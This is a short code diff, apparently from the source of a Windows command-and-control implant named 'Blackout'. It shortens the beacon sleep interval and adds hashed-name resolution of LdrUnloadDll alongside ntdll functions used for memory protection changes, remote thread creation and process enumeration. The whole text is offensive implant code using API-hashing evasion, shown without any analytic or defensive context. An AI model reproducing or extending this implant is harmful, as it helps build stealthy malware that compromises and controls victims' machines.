@@ -8,7 +8,7 @@
 #define CONFIG_SECURE     FALSE
 #define CONFIG_WRKHRS     NULL
 #define CONFIG_KILLDATE   NULL
-#define CONFIG_SLEEP      15
+#define CONFIG_SLEEP      5
 
 FUNC VOID BlackoutInit( 
     PVOID Param
@@ -97,6 +97,7 @@ FUNC VOID BlackoutInit(
     Instance()->Win32.NtProtectVirtualMemory    = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) );
     Instance()->Win32.NtCreateThreadEx          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
     Instance()->Win32.LdrLoadDll                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrLoadDll" ) );
+    Instance()->Win32.LdrUnloadDll              = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrUnloadDll" ) );
     Instance()->Win32.NtGetNextProcess          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtGetNextProcess" ) );
 
     Instance()->Win32.NtQuerySystemInformation  = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQuerySystemInformation" ) );
